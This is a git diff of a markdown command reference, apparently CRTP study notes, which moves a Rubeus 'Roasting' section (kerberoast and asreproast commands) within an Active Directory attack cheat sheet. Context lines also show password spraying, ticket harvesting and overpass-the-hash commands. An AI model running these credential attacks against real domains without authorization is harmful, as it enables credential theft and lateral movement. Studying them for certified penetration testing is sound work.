@@ -23,9 +23,9 @@
   - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
 - [Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)
   - [Brute](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#basic)
+  - [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#roasting)
   - [List Tickets](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#list-tickets)
   - [Pass-the-key/Over-PTH](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#pass-the-keyover-pth)
-  - [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#roasting)
   - [Golden/Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#goldensilver)
   - [Maintenance](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
   - [S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
@@ -463,6 +463,14 @@ Brute Password spray:
 
 ```Rubeus.exe brute /password:Password01 /noticket```
 
+#### Roasting
+```Rubeus.exe kerberoast /nowrap```
+- [Full kerberoast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-1)
+
+```Rubeus.exe asreproast /nowrap```
+- [Full aseproast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#get-as-reps)
+
+
 #### List tickets
 Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30```
@@ -473,7 +481,6 @@ Request ticket (TGT) based on username and password/hash:
 ```
 Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
 ```
-
 - [from previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
 
 Request Service ticket (TGS) based on Service Name:
@@ -483,13 +490,6 @@ Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
-
-#### Roasting
-```Rubeus.exe kerberoast /nowrap```
-- [Full kerberoast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-1)
-
-```Rubeus.exe asreproast /nowrap```
-- [Full aseproast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#get-as-reps)
 
 #### Golden/Silver
 Hash of a user:
